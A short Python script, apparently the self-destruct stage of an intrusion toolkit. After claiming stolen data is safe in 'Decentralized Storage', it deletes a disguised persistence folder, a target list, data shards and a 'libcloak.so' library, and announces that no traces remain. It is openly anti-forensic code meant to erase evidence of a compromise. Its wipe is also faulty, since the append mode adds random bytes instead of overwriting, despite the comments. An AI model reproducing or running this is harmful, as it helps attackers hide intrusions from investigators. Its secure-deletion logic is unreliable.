import os
import shutil

def secure_self_destruct():
    print("[!] [EXIT] Data Secured in Decentralized Storage.")
    print("[!] [EXIT] Triggering Global Self-Shredding Protocol...")
    
    # Paths to wipe
    targets = [
        os.path.expanduser("~/.local/share/sys_update"),
        "/tmp/targets.txt",
        "shards/",
        "libcloak.so"
    ]
    
    for path in targets:
        if os.path.exists(path):
            if os.path.isdir(path):
                # Overwrite and remove
                shutil.rmtree(path)
            else:
                # Zero out the file before deleting (Anti-Forensics)
                size = os.path.getsize(path)
                with open(path, "ba+") as f:
                    f.write(os.urandom(size))
                os.remove(path)
            print(f"[+] [BURNED] {path}")

    print("[SUCCESS] The 12th Name has vanished. No traces remain.")

if __name__ == "__main__":
    secure_self_destruct()
